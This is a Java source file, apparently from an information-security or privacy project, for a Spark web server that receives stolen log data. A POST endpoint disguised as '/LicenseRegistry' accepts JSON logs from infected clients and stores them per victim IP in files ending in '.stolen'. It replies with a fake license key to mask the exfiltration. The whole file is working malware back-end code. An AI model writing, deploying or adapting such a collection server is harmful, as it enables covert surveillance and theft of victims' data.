package com.cjwagner.InfoSecPriv;

import static spark.Spark.*;

import java.io.File;
import java.io.IOException;
import java.util.Date;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import org.apache.commons.io.FileUtils;

import com.fasterxml.jackson.core.JsonParseException;

public class ExtensionServer {
	
	private static Map<String, LoggerMessage> logStore;
	private final static int MAXSTORESIZE = 10000;
	private static int storeSize;
    private static final int HTTP_BAD_REQUEST = 400;
    private static String logDir = "/logs";
    private static final String logFileExt = ".stolen";
	
	public static void main(String[] args)
	{
		initializeLogStore();
		
		post("/LicenseRegistry", (request, response)->
			{
				if(storeSize >= MAXSTORESIZE)
				{
					response.status(507);//insufficient storage
					return "Server storage full!";
				}
				
				String ip = request.ip().replace(':', '_');
				String json = request.body();
				
				try
				{
					LoggerMessage logMess = LoggerMessage.fromJSON(json);
					logMess.setFirstLogTime(new Date());
					LoggerMessage rec = logStore.get(ip);
					if (rec == null)
					{
						logStore.put(ip, logMess);
						rec = logMess;
					}
					else
					{
						rec.getLogs().addAll(logMess.getLogs());
					}
					updateLogFile(ip, rec);
					storeSize += logMess.getLogs().size();
					response.status(200);
					
					System.out.println("Recieved log data from IP: " + ip);
					return "LicenseKey:<c706cfe7-b748-4d75-98b5-c6b32ab789cb>";
				}
				catch(JsonParseException jpe)
				{
					response.status(HTTP_BAD_REQUEST);
					System.out.println("Failed to parse log data from IP: " + ip);
					return jpe.getMessage();
				}
			});
	}

	private static void initializeLogStore() {
		
		System.out.println("Initializing Log Store...");
		
		int fileLoadCount = 0;
		storeSize = 0;
		logStore = new ConcurrentHashMap<String, LoggerMessage>();
		File dir = new File(logDir);
		dir.mkdir();
		
		File[] files = dir.listFiles();
		for(File file : files)
		{
			String fullName = file.getName();
			String ext = getExtension(fullName);
			String ip = rmvExtension(fullName);
			if(!ext.equals(logFileExt) || ip.length() == 0)
			{
				continue;
			}
			LoggerMessage data = null;
			try
			{
				System.out.println(file.toString());
				String json = FileUtils.readFileToString(file, null);
				data = LoggerMessage.fromJSON(json);
			}
			catch (Exception e)
			{
				System.out.println("Failed to parse file: " + fullName + "  ERROR: " + e.getMessage());
				continue;
			}
			//data is verified at this point
			LoggerMessage rec = logStore.get(ip);
			if (rec == null)
			{
				logStore.put(ip, data);
			}
			else
			{
				rec.getLogs().addAll(data.getLogs());
			}
			storeSize += data.getLogs().size();
			fileLoadCount++;
		}
		System.out.println("Initialization complete.  Files loaded: " + fileLoadCount + "  Total logs loaded: " + storeSize);
	}
	
	private static String rmvExtension(String filename)
	{
		int idx = filename.lastIndexOf(".");
		return filename.substring(0, idx);
	}
	
	private static String getExtension(String filename)
	{
		int idx = filename.lastIndexOf(".");
		return filename.substring(idx, filename.length());
	}
	
	private static void updateLogFile(String ip, LoggerMessage data)
	{
		File file = new File(logDir + "/" + ip + logFileExt);
		try {
			FileUtils.writeStringToFile(file, LoggerMessage.toJSON(data), null);
		} 
		catch (IOException e) {
			System.out.println("Failed to create file: " + file.getName() + "  ERROR: " + e.getMessage());
		}
	}
}
